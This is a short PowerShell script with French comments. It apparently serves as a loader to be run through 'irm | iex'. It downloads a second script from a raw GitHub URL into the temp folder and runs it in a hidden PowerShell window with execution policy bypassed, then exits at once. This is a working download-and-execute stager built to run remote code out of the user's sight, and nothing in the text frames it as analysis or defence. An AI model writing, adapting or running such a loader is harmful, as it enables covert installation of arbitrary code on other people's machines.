# URL du script secondaire (celui que tu veux vraiment exécuter en arrière‑plan)
$scriptUrl = "https://raw.githubusercontent.com/usedzqd17/testiex1/main/install.ps1"

# Créer un chemin temporaire où enregistrer le script téléchargé
$temp = "$env:TEMP\run_script.ps1"

# Télécharger le script secondaire
Invoke-WebRequest -Uri $scriptUrl -OutFile $temp

# Lancer le script téléchargé dans une fenêtre PowerShell complètement cachée
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$temp`""

# Fermer immédiatement le script principal (celui exécuté depuis irm | iex)
exit

